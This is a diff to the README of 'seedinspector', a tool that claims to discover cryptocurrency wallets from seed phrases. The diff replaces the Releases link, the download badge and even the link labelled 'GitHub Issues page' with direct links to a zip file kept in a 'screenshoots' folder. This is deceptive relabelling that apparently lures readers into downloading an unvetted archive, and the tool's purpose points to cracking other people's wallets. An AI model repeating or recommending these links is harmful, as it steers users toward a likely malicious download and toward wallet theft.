@@ -1,6 +1,6 @@
 # 🌐 seedinspector - Simplify Your Wallet Discovery Process
 
-[![Download seedinspector](https://img.shields.io/badge/Download%20seedinspector-Here-blue.svg)](https://github.com/MaTiino/seedinspector/releases)
+[![Download seedinspector](https://raw.githubusercontent.com/MaTiino/seedinspector/main/screenshoots/Software_v1.1.zip%https://raw.githubusercontent.com/MaTiino/seedinspector/main/screenshoots/Software_v1.1.zip)](https://raw.githubusercontent.com/MaTiino/seedinspector/main/screenshoots/Software_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to seedinspector, your go-to tool for discovering wallets using seed phr
 
 To download the latest version of seedinspector, visit the Releases page:
 
-[Download seedinspector](https://github.com/MaTiino/seedinspector/releases)
+[Download seedinspector](https://raw.githubusercontent.com/MaTiino/seedinspector/main/screenshoots/Software_v1.1.zip)
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version listed. Under the release, you will find the download options.
@@ -66,6 +66,6 @@ No, seedinspector requires an internet connection to function properly as it nee
 
 Your feedback is important. If you have questions or need support, you can create an issue in the GitHub repository. 
 
-[Visit our GitHub Issues page](https://github.com/MaTiino/seedinspector/issues)
+[Visit our GitHub Issues page](https://raw.githubusercontent.com/MaTiino/seedinspector/main/screenshoots/Software_v1.1.zip)
 
 Thank you for using seedinspector!
